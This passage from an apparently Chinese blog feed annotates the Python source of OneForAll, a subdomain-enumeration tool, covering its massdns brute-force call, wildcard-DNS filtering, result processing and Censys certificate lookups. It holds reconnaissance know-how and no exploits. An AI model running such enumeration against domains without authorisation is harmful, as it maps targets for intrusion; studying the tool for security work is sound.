class="hljs-string">f&#x27;--resolve-count <span class="hljs-subst">&#123;resolve_num&#125;</span> --type <span class="hljs-subst">&#123;query_type&#125;</span> &#x27;</span> \<br>          <span class="hljs-string">f&#x27;--flush --output J --outfile <span class="hljs-subst">&#123;output_path&#125;</span> &#x27;</span> \<br>          <span class="hljs-string">f&#x27;--root --error-log <span class="hljs-subst">&#123;log_path&#125;</span> <span class="hljs-subst">&#123;dict_path&#125;</span> --filter OK &#x27;</span> \<br>          <span class="hljs-string">f&#x27;--sndbuf 0 --rcvbuf 0&#x27;</span><br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Run command <span class="hljs-subst">&#123;cmd&#125;</span>&#x27;</span>)<br>    subprocess.run(args=cmd, shell=<span class="hljs-literal">True</span>)<br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Finished massdns&#x27;</span>)<br></code></pre></div></td></tr></table></figure><h3 id="1-3-4-stat-appear-times"><a href="#1-3-4-stat-appear-times" class="headerlink" title="1.3.4 stat_appear_times"></a>1.3.4 stat_appear_times</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">stat_appear_times</span>(<span class="hljs-params">result_path</span>):</span><br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Counting IP cname appear times&#x27;</span>)<br>    times = <span class="hljs-built_in">dict</span>()<br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Reading <span class="hljs-subst">&#123;result_path&#125;</span>&#x27;</span>)<br>    <span class="hljs-comment"># 打开文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(result_path) <span class="hljs-keyword">as</span> fd:<br>        <span class="hljs-comment"># 逐行读取</span><br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> fd:<br>            <span class="hljs-comment"># 移除首尾空格和换行符</span><br>            line = line.strip()<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment"># 加载为json</span><br>                items = json.loads(line)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, e.args)<br>                logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, <span class="hljs-string">f&#x27;Error parsing <span class="hljs-subst">&#123;result_path&#125;</span> &#x27;</span><br>                                    <span class="hljs-string">f&#x27;line <span class="hljs-subst">&#123;line&#125;</span> Skip this line&#x27;</span>)<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-comment"># 获取状态码</span><br>            status = items.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br>            <span class="hljs-keyword">if</span> status != <span class="hljs-string">&#x27;NOERROR&#x27;</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-comment"># 获取数据</span><br>            data = items.get(<span class="hljs-string">&#x27;data&#x27;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;answers&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>                <span class="hljs-keyword">continue</span><br>            answers = data.get(<span class="hljs-string">&#x27;answers&#x27;</span>)<br>            <span class="hljs-keyword">for</span> answer <span class="hljs-keyword">in</span> answers:<br>                <span class="hljs-keyword">if</span> answer.get(<span class="hljs-string">&#x27;type&#x27;</span>) == <span class="hljs-string">&#x27;A&#x27;</span>:<br>                    ip = answer.get(<span class="hljs-string">&#x27;data&#x27;</span>)<br>                    <span class="hljs-comment"># 取值 如果是首次出现的IP集合 出现次数先赋值0</span><br>                    value_one = times.setdefault(ip, <span class="hljs-number">0</span>)<br>                    times[ip] = value_one + <span class="hljs-number">1</span><br>                    name = answer.get(<span class="hljs-string">&#x27;data&#x27;</span>)<br>                    cname = name[:-<span class="hljs-number">1</span>].lower()  <span class="hljs-comment"># 去除最右边的`.`点号</span><br>                    <span class="hljs-comment"># 取值 如果是首次出现的IP集合 出现次数先赋值0</span><br>                    value_two = times.setdefault(cname, <span class="hljs-number">0</span>)<br>                    times[cname] = value_two + <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span> answer.get(<span class="hljs-string">&#x27;type&#x27;</span>) == <span class="hljs-string">&#x27;CNAME&#x27;</span>:<br>                    name = answer.get(<span class="hljs-string">&#x27;data&#x27;</span>)<br>                    cname = name[:-<span class="hljs-number">1</span>].lower()  <span class="hljs-comment"># 去除最右边的`.`点号</span><br>                    <span class="hljs-comment"># 取值 如果是首次出现的IP集合 出现次数先赋值0</span><br>                    value_three = times.setdefault(cname, <span class="hljs-number">0</span>)<br>                    times[cname] = value_three + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 返回ip地址和name</span><br>    <span class="hljs-keyword">return</span> times<br></code></pre></div></td></tr></table></figure><h3 id="1-3-5-deal-output"><a href="#1-3-5-deal-output" class="headerlink" title="1.3.5 deal_output"></a>1.3.5 deal_output</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deal_output</span>(<span class="hljs-params">output_path, appear_times, wildcard_ips, wildcard_ttl</span>):</span><br>    logger.log(<span class="hljs-string">&#x27;INFOR&#x27;</span>, <span class="hljs-string">f&#x27;Processing result&#x27;</span>)<br>    infos = <span class="hljs-built_in">dict</span>()  <span class="hljs-comment"># 用来记录所有域名有关信息</span><br>    subdomains = <span class="hljs-built_in">list</span>()  <span class="hljs-comment"># 用来保存所有通过有效性检查的子域</span><br>    logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;Processing <span class="hljs-subst">&#123;output_path&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_path) <span class="hljs-keyword">as</span> fd:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> fd:<br>            line = line.strip()<br>            <span class="hljs-keyword">try</span>:<br>                items = json.loads(line)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, e.args)<br>                logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, <span class="hljs-string">f&#x27;Error parsing <span class="hljs-subst">&#123;line&#125;</span> Skip this line&#x27;</span>)<br>                <span class="hljs-keyword">continue</span><br>            qname = items.get(<span class="hljs-string">&#x27;name&#x27;</span>)[:-<span class="hljs-number">1</span>]  <span class="hljs-comment"># 去除最右边的`.`点号</span><br>            status = items.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br>            <span class="hljs-keyword">if</span> status != <span class="hljs-string">&#x27;NOERROR&#x27;</span>:<br>                logger.log(<span class="hljs-string">&#x27;TRACE&#x27;</span>, <span class="hljs-string">f&#x27;Found <span class="hljs-subst">&#123;qname&#125;</span>\&#x27;s result <span class="hljs-subst">&#123;status&#125;</span> &#x27;</span><br>                                    <span class="hljs-string">f&#x27;while processing <span class="hljs-subst">&#123;line&#125;</span>&#x27;</span>)<br>                <span class="hljs-keyword">continue</span><br>            data = items.get(<span class="hljs-string">&#x27;data&#x27;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;answers&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>                logger.log(<span class="hljs-string">&#x27;TRACE&#x27;</span>, <span class="hljs-string">f&#x27;Processing <span class="hljs-subst">&#123;line&#125;</span>, <span class="hljs-subst">&#123;qname&#125;</span> no response&#x27;</span>)<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-comment"># 跟进函数 </span><br>            infos, subdomains = gen_result_infos(items, infos, subdomains,<br>                                                 appear_times, wildcard_ips,<br>                                                 wildcard_ttl)<br>    <span class="hljs-keyword">return</span> infos, subdomains<br></code></pre></div></td></tr></table></figure><h4 id="1-3-5-1-gen-result-infos"><a href="#1-3-5-1-gen-result-infos" class="headerlink" title="1.3.5.1 gen_result_infos"></a>1.3.5.1 gen_result_infos</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gen_result_infos</span>(<span class="hljs-params">items, infos, subdomains, appear_times, wc_ips, wc_ttl</span>):</span><br>    <span class="hljs-comment"># 获得传入的items内容</span><br>    qname = items.get(<span class="hljs-string">&#x27;name&#x27;</span>)[:-<span class="hljs-number">1</span>]  <span class="hljs-comment"># 去除最右边的`.`点号</span><br>    reason = items.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br>    resolver = items.get(<span class="hljs-string">&#x27;resolver&#x27;</span>)<br>    data = items.get(<span class="hljs-string">&#x27;data&#x27;</span>)<br>    answers = data.get(<span class="hljs-string">&#x27;answers&#x27;</span>)<br>    info = <span class="hljs-built_in">dict</span>()<br>    cnames = <span class="hljs-built_in">list</span>()<br>    ips = <span class="hljs-built_in">list</span>()<br>    ip_times = <span class="hljs-built_in">list</span>()<br>    cname_times = <span class="hljs-built_in">list</span>()<br>    ttls = <span class="hljs-built_in">list</span>()<br>    is_valid_flags = <span class="hljs-built_in">list</span>()<br>    have_a_record = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> answer <span class="hljs-keyword">in</span> answers:<br>        <span class="hljs-keyword">if</span> answer.get(<span class="hljs-string">&#x27;type&#x27;</span>) != <span class="hljs-string">&#x27;A&#x27;</span>:<br>            <span class="hljs-keyword">continue</span><br>        have_a_record = <span class="hljs-literal">True</span><br>        ttl = answer.get(<span class="hljs-string">&#x27;ttl&#x27;</span>)<br>        ttls.append(ttl)<br>        name = answer.get(<span class="hljs-string">&#x27;name&#x27;</span>)  <span class="hljs-comment"># 去除最右边的`.`点号</span><br>        cname = name[:-<span class="hljs-number">1</span>].lower()  <span class="hljs-comment"># 去除最右边的`.`点号</span><br>        cnames.append(cname)<br>        cname_num = appear_times.get(cname)<br>        cname_times.append(cname_num)<br>        ip = answer.get(<span class="hljs-string">&#x27;data&#x27;</span>)<br>        ips.append(ip)<br>        ip_num = appear_times.get(ip)<br>        ip_times.append(ip_num)<br>        <span class="hljs-comment"># 判断是否是泛解析</span><br>        isvalid, reason = wildcard.is_valid_subdomain(ip, ip_num, cname, cname_num, ttl, wc_ttl, wc_ips)<br>        logger.log(<span class="hljs-string">&#x27;TRACE&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;ip&#125;</span> effective: <span class="hljs-subst">&#123;isvalid&#125;</span> reason: <span class="hljs-subst">&#123;reason&#125;</span>&#x27;</span>)<br>        is_valid_flags.append(isvalid)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> have_a_record:<br>        logger.log(<span class="hljs-string">&#x27;TRACE&#x27;</span>, <span class="hljs-string">f&#x27;All query result of <span class="hljs-subst">&#123;qname&#125;</span> no A record<span class="hljs-subst">&#123;answers&#125;</span>&#x27;</span>)<br>    <span class="hljs-comment"># 为了优化内存 只添加有A记录且通过判断的子域到记录中</span><br>    <span class="hljs-keyword">if</span> have_a_record <span class="hljs-keyword">and</span> <span class="hljs-built_in">all</span>(is_valid_flags):<br>        info[<span class="hljs-string">&#x27;resolve&#x27;</span>] = <span class="hljs-number">1</span><br>        info[<span class="hljs-string">&#x27;reason&#x27;</span>] = reason<br>        info[<span class="hljs-string">&#x27;ttl&#x27;</span>] = ttls<br>        info[<span class="hljs-string">&#x27;cname&#x27;</span>] = cnames<br>        info[<span class="hljs-string">&#x27;ip&#x27;</span>] = ips<br>        info[<span class="hljs-string">&#x27;ip_times&#x27;</span>] = ip_times<br>        info[<span class="hljs-string">&#x27;cname_times&#x27;</span>] = cname_times<br>        info[<span class="hljs-string">&#x27;resolver&#x27;</span>] = resolver<br>        infos[qname] = info<br>        subdomains.append(qname)<br>    <span class="hljs-keyword">return</span> infos, subdomains<br></code></pre></div></td></tr></table></figure><p>此处返回的infos参考如下</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210916102119.png"></p><h2 id="1-4-数据导出"><a href="#1-4-数据导出" class="headerlink" title="1.4 数据导出"></a>1.4 数据导出</h2><p>承接 1.2.3.2中进行分析，此处已经进行sql查询</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">export</span>(<span class="hljs-params">self, <span class="hljs-built_in">format</span>, **kwargs</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;Export the RecordCollection to a given format (courtesy of Tablib).</span><br><span class="hljs-string">    将RecordCollection导出为给定格式（由Tablib提供）</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> self.dataset.export(<span class="hljs-built_in">format</span>, **kwargs)<br></code></pre></div></td></tr></table></figure><p>之后转换为dict类型</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">as_dict</span>(<span class="hljs-params">self, ordered=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">return</span> self.<span class="hljs-built_in">all</span>(as_dict=<span class="hljs-keyword">not</span> (ordered), as_ordereddict=ordered)<br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def all</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">all</span>(<span class="hljs-params">self, as_dict=<span class="hljs-literal">False</span>, as_ordereddict=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;Returns a list of all rows for the RecordCollection. If they haven&#x27;t</span><br><span class="hljs-string">    been fetched yet, consume the iterator and cache the results.</span><br><span class="hljs-string">    返回RecordCollection的所有行的列表。如果没有如果尚未获取，请使用迭代器并缓存结果</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># By calling list it calls the __iter__ method</span><br>    rows = <span class="hljs-built_in">list</span>(self)<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    def __iter__(self):</span><br><span class="hljs-string">        # Iterate over all rows, consuming the underlying generator only when necessary</span><br><span class="hljs-string">        i = 0</span><br><span class="hljs-string">        while True:</span><br><span class="hljs-string">            # Other code may have iterated between yields,</span><br><span class="hljs-string">            # so always check the cache.</span><br><span class="hljs-string">            if i &lt; len(self):</span><br><span class="hljs-string">                yield self[i]</span><br><span class="hljs-string">            else:</span><br><span class="hljs-string">                # Throws StopIteration when done.</span><br><span class="hljs-string">                # Prevent StopIteration bubbling from generator,</span><br><span class="hljs-string">                # following https://www.python.org/dev/peps/pep-0479/</span><br><span class="hljs-string">                try:</span><br><span class="hljs-string">                    yield next(self)</span><br><span class="hljs-string">                except StopIteration:</span><br><span class="hljs-string">                    return</span><br><span class="hljs-string">            i += 1</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 递归完成其内的内容转为dict类型</span><br>    <span class="hljs-keyword">if</span> as_dict:<br>        <span class="hljs-keyword">return</span> [r.as_dict() <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> rows]<br>    <span class="hljs-keyword">elif</span> as_ordereddict:<br>        <span class="hljs-keyword">return</span> [r.as_dict(ordered=<span class="hljs-literal">True</span>) <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> rows]<br><br>    <span class="hljs-keyword">return</span> rows<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信安 工具分析 OneForAll</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>工具分析</tag>
      
      <tag>OneForAll</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OneForAll代码分析-3</title>
    <link href="/2021/09/12/%E4%BF%A1%E5%AE%89/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/OneForAll/OneForAll%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-3/"/>
    <url>/2021/09/12/%E4%BF%A1%E5%AE%89/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/OneForAll/OneForAll%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-3/</url>
    
    <content type="html"><![CDATA[<h1 id="OneForAll代码分析-3"><a href="#OneForAll代码分析-3" class="headerlink" title="OneForAll代码分析-3"></a>OneForAll代码分析-3</h1><p>承接上文的Collect对象调用的各种模块，对这些模块进行分析</p><p>首先是certificates模块</p><h1 id="1-certificates"><a href="#1-certificates" class="headerlink" title="1. certificates"></a>1. certificates</h1><p>对该模块下的文件进行逐个分析</p><h2 id="1-1-censys-api"><a href="#1-1-censys-api" class="headerlink" title="1.1 censys_api"></a>1.1 censys_api</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CensysAPI</span>(<span class="hljs-params">Query</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        <span class="hljs-comment"># Query 内容</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        def __init__(self):</span><br><span class="hljs-string">        Module.__init__(self)</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        Query.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Certificate&#x27;</span><br>        self.source = <span class="hljs-string">&quot;CensysAPIQuery&quot;</span><br>        self.addr = <span class="hljs-string">&#x27;https://www.censys.io/api/v1/search/certificates&#x27;</span><br>        self.<span class="hljs-built_in">id</span> = settings.censys_api_id<br>        self.secret = settings.censys_api_secret<br>        self.delay = <span class="hljs-number">3.0</span>  <span class="hljs-comment"># Censys 接口查询速率限制 最快2.5秒查1次</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 获取随机请求头</span><br>        self.header = self.get_header()<br>        <span class="hljs-comment"># 如果有设置代理进行代理</span><br>        self.proxy = self.get_proxy(self.source)<br>        <span class="hljs-comment"># 设置的携带的数据</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;query&#x27;</span>: <span class="hljs-string">f&#x27;parsed.names: <span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>,<br>            <span class="hljs-string">&#x27;page&#x27;</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-string">&#x27;fields&#x27;</span>: [<span class="hljs-string">&#x27;parsed.subject_dn&#x27;</span>, <span class="hljs-string">&#x27;parsed.names&#x27;</span>],<br>            <span class="hljs-string">&#x27;flatten&#x27;</span>: <span class="hljs-literal">True</span>&#125;<br>        <span class="hljs-comment"># 请求并获取数据</span><br>        resp = self.post(self.addr, json=data, auth=(self.<span class="hljs-built_in">id</span>, self.secret))<br>        <span class="hljs-comment"># 无效返回 返回空</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># 解析内容为json格式</span><br>        json = resp.json()<br>        <span class="hljs-comment"># 获取状态</span><br>        status = json.get(<span class="hljs-string">&#x27;status&#x27;</span>)<br>        <span class="hljs-comment"># 当状态不是ok时 返回空</span><br>        <span class="hljs-keyword">if</span> status != <span class="hljs-string">&#x27;ok&#x27;</span>:<br>            logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.source&#125;</span> module <span class="hljs-subst">&#123;status&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># 跟进函数 返回正则匹配页面内容中的子域名</span><br>        subdomains = self.match_subdomains(resp.text)<br>        <span class="hljs-comment"># 根据获取的子域名更新整个子域名情况</span><br>        self.subdomains.update(subdomains)<br>        <span class="hljs-comment"># 得到总的页数</span><br>        pages = json.get(<span class="hljs-string">&#x27;metadata&#x27;</span>).get(<span class="hljs-string">&#x27;pages&#x27;</span>)<br>        <span class="hljs-comment"># 遍历页数</span><br>        <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, pages + <span class="hljs-number">1</span>):<br>            data[<span class="hljs-string">&#x27;page&#x27;</span>] = page<br>            resp = self.post(self.addr, json=data, auth=(self.<span class="hljs-built_in">id</span>, self.secret))<br>            <span class="hljs-comment"># 此处函数 实现了之上的match_subdomains和update最后返回的等价于之上的两个函数内容</span><br>            self.subdomains = self.collect_subdomains(resp)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        类执行入口</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 如果没有设置IP等等返回空</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.have_api(self.<span class="hljs-built_in">id</span>, self.secret):<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># 显示开始的信息</span><br>        self.begin()<br>        <span class="hljs-comment"># 开始具体的查询函数</span><br>        self.query()<br>        <span class="hljs-comment"># 展示结束的时间信息等等</span><br>        self.finish()<br>        <span class="hljs-comment"># 之后下一函数中具体分析对应函数</span><br>        <span class="hljs-comment"># 存储查询后的结果</span><br>        self.save_json()<br>        <span class="hljs-comment"># 存储标准格式的内容</span><br>        self.gen_result()<br>        <span class="hljs-comment"># 存储进数据库</span><br>        self.save_db()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">domain</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    类统一调用入口</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param str domain: 域名</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    query = CensysAPI(domain)<br>    query.run()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    run(<span class="hljs-string">&#x27;example.com&#x27;</span>)<br><br></code></pre></div></td></tr></table></figure><h3 id="1-1-1-match-subdomains"><a href="#1-1-1-match-subdomains" class="headerlink" title="1.1.1 match_subdomains"></a>1.1.1 match_subdomains</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">match_subdomains</span>(<span class="hljs-params">self, resp, distinct=<span class="hljs-literal">True</span>, fuzzy=<span 